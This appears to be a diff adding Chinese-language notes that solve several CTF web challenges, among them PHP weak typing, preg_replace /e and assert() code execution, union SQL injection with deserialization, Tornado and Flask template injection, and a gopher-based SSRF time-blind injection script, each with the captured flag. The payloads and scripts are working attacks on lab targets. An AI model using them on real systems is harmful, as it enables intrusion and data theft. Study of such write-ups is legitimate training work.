@@ -1,0 +1,317 @@
+-->> lottery php弱类型比较:
+# 关键源码
+$money = $_SESSION['money'];
+$numbers = $req['numbers'];  # 可控变量输入
+$win_numbers = random_win_nums();
+$same_count = 0;
+for($i=0; $i<7; $i++){
+    if($numbers[$i] == $win_numbers[$i]){  # 弱类型比较，true == 任意非0数字
+        $same_count++;
+    }
+}
+
+# payload
+{"action":"buy","numbers":[true,true,true,true,true,true,true]} # 开出非0数字，就能中最高奖金
+
+# 购买flag
+{"action":"flag","numbers":[true,true,true,true,true,true,true]}
+
+
+
+-->> ics-05 文件读取漏洞 + 查找源码后门 + preg_replace代码执行漏洞:
+# 查看设备维护中心
+http://61.147.171.105:65259/index.php?page=login  # 判断是否存在文件读取漏洞
+
+# filter伪协议漏洞 读取index源文件
+GET /index.php?page=php://filter/read=convert.base64-encode/resource=index.php
+
+# index.php 后门代码段
+if ($_SERVER['HTTP_X_FORWARDED_FOR'] === '127.0.0.1') {  # 请求头设置  X-Forwarded-For: 127.0.0.1
+
+    echo "<br >Welcome My Admin ! <br >";
+
+    $pattern = $_GET[pat];
+    $replacement = $_GET[rep];
+    $subject = $_GET[sub];
+
+    if (isset($pattern) && isset($replacement) && isset($subject)) {
+        preg_replace($pattern, $replacement, $subject);  # preg_replace 代码执行漏洞
+    }else{
+        die();
+    }
+
+}
+
+# 构建代码执行  payload
+GET /index.php?pat=/(.*)/e&rep=system('ls')&sub=aa  #  .* 匹配任意字符0次或多次
+# GET /index.php?pat=/abc/e&rep=system('ls')&sub=abcd
+X-Forwarded-For: 127.0.0.1
+
+# 查看phpinfo
+http://61.147.171.105:65259/index.php?pat=/(.*)/e&rep=phpinfo()&sub=aa
+X-Forwarded-For: 127.0.0.1
+
+# 获取flag
+GET /index.php?pat=/(.*)/e&rep=system('cat${IFS}s3chahahaDir/flag/flag.php')&sub=aa
+X-Forwarded-For: 127.0.0.1
+# cyberpeace{3bf62a7ed56123d077d1462288763355}
+
+
+-->> MFW assert()命令执行漏洞:
+# dirsearch目录扫描
+http://61.147.171.105:65500/templates/
+[ ] about.php   2018-09-16 03:05    147      
+[ ] contact.php 2018-09-16 03:05    93   
+[ ] flag.php    2023-03-12 17:17    63   # flag
+[ ] home.php    2018-09-16 03:05    165      
+
+#  filter伪协议读取 失败
+php://filter/read=convert.base64-encode/resource=flag
+php://filter/convert.iconv.UTF-8.UTF-7/resource=flag
+
+GET /?page=../../../../../etc/passwd  #  被检测到
+
+#  githack 读取源码
+python githack.py http://61.147.171.105:65500/.git/
+
+#  查看 index.php 源代码
+if (isset($_GET['page'])) {
+    $page = $_GET['page'];
+} else {
+    $page = "home";
+}
+$file = "templates/" . $page . ".php";
+#  I heard '..' is dangerous!
+assert("strpos('$file', '..') === false") or die("Detected hacking attempt!");
+#  TODO: Make this look nice
+assert("file_exists('$file')") or die("That file doesn't exist!");  #  闭合前面的file_exists函数，达到执行函数的目的
+
+# 构造payload
+GET /?page='.system("ls").'
+#  index.php
+#  templates
+#  index.php
+#  templates
+#  That file doesn't exist!
+
+#读取flag
+GET /?page='.system("cat+templates/flag.php").'
+# cyberpeace{7f229a680fcea2aca0b41948edecaa3c}
+
+
+-->> fakebook SQL注入 + 反序列化  ||  SQL注入 + load_file():
+# 存在SQL注入
+GET /view.php?no=2
+
+#获取数据库
+GET /view.php?no=2+union/**/select+1,database(),3,4# 
+#fakebook
+
+#获取表民
+GET /view.php?no=2+union/**/select+1,group_concat(table_name),3,4+from+information_schema.tables+where+table_schema=database()# 
+#users
+
+#获取字段名
+GET /view.php?no=2+union/**/select+1,group_concat(column_name),3,4+from+information_schema.columns+where+table_name="users"# 
+#no,username,passwd,data,USER,CURRENT_CONNECTIONS,TOTAL_CONNECTIONS  
+
+# 获取data字段 数据
+GET /view.php?no=2+union/**/select+1,data,3,4+from+users# 
+#O:8:"UserInfo":3:{s:4:"name";s:5:"admin";s:3:"age";i:25;s:4:"blog";s:13:"www.baidu.com";} 
+#得出用户信息是序列化存储在数据库中，读取数据时会进行 反序列化
+
+#构造 反序列化  payload
+O:8:"UserInfo":3:{s:4:"name";s:5:"admin";s:3:"age";i:25;s:4:"blog";s:29:"file:///var/www/html/flag.php";}
+#data:text/html;base64,PD9waHANCg0KJGZsYWcgPSAiZmxhZ3tjMWU1NTJmZGY3NzA0OWZhYmY2NTE2OGYyMmY3YWVhYn0iOw0KZXhpdCgwKTsNCg==
+
+#base64解码  获取flag
+$flag = "flag{c1e552fdf77049fabf65168f22f7aeab}";
+
+
+#SQL注入 + load_file()  mysql函数，直接读取系统文件
+GET /view.php?no=2+union/**/select+1,load_file('/var/www/html/flag.php'),3,4#
+#$flag = "flag{c1e552fdf77049fabf65168f22f7aeab}";
+
+
+-->> simple_js 考验JS解密:
+#原加密函数代码
+function dechiffre(pass_enc){
+    var pass = "70,65,85,88,32,80,65,83,83,87,79,82,68,32,72,65,72,65";
+    var tab  = pass_enc.split(',');
+    var tab2 = pass.split(',');
+    var i,j,k,l=0,m,n,o,p = "";
+    i = 0;
+    j = tab.length;
+    k = j + (l) + (n=0);
+    n = tab2.length;
+    for(i = (o=0); i < (k = j = n); i++ )
+    {
+        o = tab[i-l];
+        p += String.fromCharCode((o = tab2[i]));
+        if(i == 5){
+            break;
+        }    
+    }
+    for(i = (o=0); i < (k = j = n); i++ ){
+        o = tab[i-l];
+        if(i > 5 && i < k-1){
+            p += String.fromCharCode((o = tab2[i]));
+        }       
+    }
+    p += String.fromCharCode(tab2[17]);
+    pass = p;
+    return pass;
+}
+String["fromCharCode"](dechiffre("\x35\x35\x2c\x35\x36\x2c\x35\x34\x2c\x37\x39\x2c\x31\x31\x35\x2c\x36\x39\x2c\x31\x31\x34\x2c\x31\x31\x36\x2c\x31\x30\x37\x2c\x34\x39\x2c\x35\x30"));
+
+h = window.prompt('Enter password');
+alert( dechiffre(h) );
+
+#整理后 函数代码
+a = [55,56,54,79,115,69,114,116,107,49,50]
+c = ""
+for i in a:
+    b = chr(i)
+    c = c + b
+print(c)
+
+#flag
+Cyberpeace{786OsErtk12
+
+
+-->> easytornado  python框架Tornado模板注入 + MD5哈希加密:
+# 点击 /flag.txt
+/flag.txt
+flag in /fllllllllllllag  #得到flag文件
+
+#点击 /welcome.txt
+/welcome.txt
+render  #python模板注入STTI
+
+#点击 /hints.txt
+/hints.txt
+md5(cookie_secret+md5(filename)) #filehash 的加密方式
+
+#访问报错页面
+http://61.147.171.105:60605/error?msg=Error  #是否存在模板注入STTI
+
+# 模板注入 获取 cookie_secret  
+http://61.147.171.105:60605/error?msg={{handler.settings}}  # {{handler.settings}}
+#{'autoreload': True, 'compiled_template_cache': False, 'cookie_secret': '133ad8de-de0d-44c9-85a3-465dc215987b'} 
+
+#PHP 加密代码，生成 /fllllllllllllag 的 filehash=d63337776e49ee555ecdf6c3050f7cbc
+$data2=md5('133ad8de-de0d-44c9-85a3-465dc215987b' . md5('/fllllllllllllag'));
+echo $data2;
+#得到filehash  d63337776e49ee555ecdf6c3050f7cbc
+
+# 访问flag文件
+http://61.147.171.105:60605/file?filename=/fllllllllllllag&filehash=d63337776e49ee555ecdf6c3050f7cbc
+#flag{3f39aea39db345769397ae895edb9c70}
+
+
+-->> shrine  flask框架模板注入 SSTI
+import flask 
+import os 
+
+app = flask.Flask(__name__) 
+app.config['FLAG'] = os.environ.pop('FLAG') 
+@app.route('/') 
+def index(): 
+    return open(__file__).read() 
+    
+@app.route('/shrine/') 
+def shrine(shrine): 
+    def safe_jinja(s): 
+        s = s.replace('(', '').replace(')', '')  #字符串过滤，对小括号进行了替换，将 ( 和 ) 替换为空字符串
+        blacklist = ['config', 'self']  #黑名单，将 config 和 self 添加进了黑名单
+        return ''.join(['{{% set {}=None%}}'.format(c) for c in blacklist]) + s 
+    
+    return flask.render_template_string(safe_jinja(shrine)) 
+    
+if __name__ == '__main__': 
+    app.run(debug=True)
+
+#构造payload
+http://61.147.171.105:60465/shrine/{{get_flashed_messages.__globals__['current_app'].config['FLAG']}}
+#flag{shrine_is_good_ssti}
+
+
+
+-->> very_easy_sql  SSRF + Cookie延时注入:
+#查看源代码，发现use.php
+http://61.147.171.105:63482/use.php?url=112
+
+#发现SSRF漏洞，构造gopher包来进行访问
+gopher://127.0.0.1:80/_GET /index.php HTTP/1.1
+Host: localhost:80
+Connection: close
+Content-Type: application/x-www-form-urlencoded
+Cookie: this_is_your_cookie="+bs+";
+
+#因为页面无回显，所有采用延时注入
+payolad = "if(substr((select * from flag),%d,1) = '%s',sleep(2),1) # " % ( pos, str_ascii)
+
+#时间盲注脚本
+import urllib.parse
+import requests
+import time
+import base64
+
+url="http://61.147.171.105:63482/use.php?url="
+flag=""
+def findFlag():
+    global flag
+    for pos in range(1,100):
+        for j in range(32,127):
+            j=(127+32)-j
+            str_ascii=chr(j)
+
+            payolad = "if(substr((select * from flag),%d,1) = '%s',sleep(2),1) # " % ( pos, str_ascii)
+            
+            #poc="') union select 1,2,if(1=1,sleep(5),1) # "
+            #poc="') union select 1,2,if(ascii( substr((select * from flag),"+str(pos)+",1) )="+str(i)+",sleep(2),1) # "
+
+            poc="') union select 1,2,"
+            poc+=payolad
+            
+            bs = str(base64.b64encode(poc.encode("utf-8")), "utf-8")
+            #print(bs)
+            final_poc="gopher://127.0.0.1:80/_GET%20%2findex.php%20HTTP%2f1.1%250d%250aHost%3A%20localhost%3A80%250d%250aConnection%3A%20close%250d%250aContent-Type%3A%20application%2fx-www-form-urlencoded%250d%250aCookie%3A%20this%5Fis%5Fyour%5Fcookie%3D"+bs+"%3B%250d%250a"
+            #print(final_poc)
+            t1=time.time()
+            res=requests.get(url+final_poc)
+            t2=time.time()
+
+            if(t2-t1>2):
+                flag+=str_ascii
+                print(flag)
+                break
+findFlag()
+print(flag)
+# 然后同理可以注入出来flag为
+# cyberpeace{b9d927b8740e8c361f28f487cb2a2ec6}
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
